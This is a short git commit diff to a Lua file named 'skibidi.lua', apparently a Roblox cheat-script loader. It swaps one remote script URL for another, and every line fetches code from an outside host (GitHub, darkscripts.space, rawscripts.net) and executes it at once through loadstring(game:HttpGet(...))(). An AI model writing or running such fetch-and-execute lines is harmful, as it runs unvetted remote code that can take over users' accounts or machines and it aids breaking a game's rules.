b1853beda7e6ec4b0014544349588a3f73a2c47c
Creambeam <andy.gallagher0714@gmail.com>
2024-12-12 15:00:30 -0600

    Update skibidi.lua

--- skibidi.lua
+++ skibidi.lua
@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/UniversalSH/refs/heads/main/alanwrench.lua"))()
+loadstring(game:HttpGet('https://darkscripts.space/scripts/76970717-ffe7-4912-8129-6a1070117916_1266166685279326271.lua',true))()
 wait(25)
 loadstring(game:HttpGet("https://rawscripts.net/raw/PLS-DONATE-szze-autofarm-11262"))()
